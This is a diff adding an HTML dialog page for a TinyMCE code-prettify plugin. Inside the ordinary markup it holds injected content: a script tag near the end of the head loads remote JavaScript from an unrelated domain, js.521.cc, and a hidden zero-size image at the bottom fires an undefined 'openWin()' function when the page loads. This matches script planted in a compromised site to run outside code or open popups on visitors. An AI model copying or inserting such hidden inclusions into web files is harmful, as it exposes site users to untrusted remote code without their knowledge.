@@ -1,0 +1,36 @@
+<!doctype html public "-//w3c//dtd xhtml 1.0 strict//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title>{#prettify_dlg.title}</title>
+	<script type="text/javascript" src="../../tiny_mce_popup.js"></script>
+	<script type="text/javascript" src="js/prettify.js"></script>
+	<style type="text/css" media="screen">
+		input {
+			vertical-align: middle;
+		}
+		label {
+			vertical-align: middle;
+		}
+		fieldset {
+			margin-bottom: 10px;
+		}
+	</style>
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+<body>
+<form onsubmit="prettifydialog.insert(); return false;" action="#">
+	
+	<fieldset>
+		<legend>{#prettify_dlg.paste}</legend>
+	<textarea name="syntax_code" id="syntax_code" rows="18" cols="100" style="width: 100%; height: 100%; font-family: 'courier new',courier,mono; font-size: 12px;" class="mcefocus"></textarea>
+	</fieldset>
+	<div class="mceactionpanel">
+		<div style="float: left">
+			<input type="submit" id="insert" name="insert" value="{#insert}" />
+		</div>
+		<div style="float: right">
+			<input type="button" id="cancel" name="cancel" value="{#cancel}" onclick="tinymcepopup.close();" />
+		</div>
+	</div>
+</form>
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
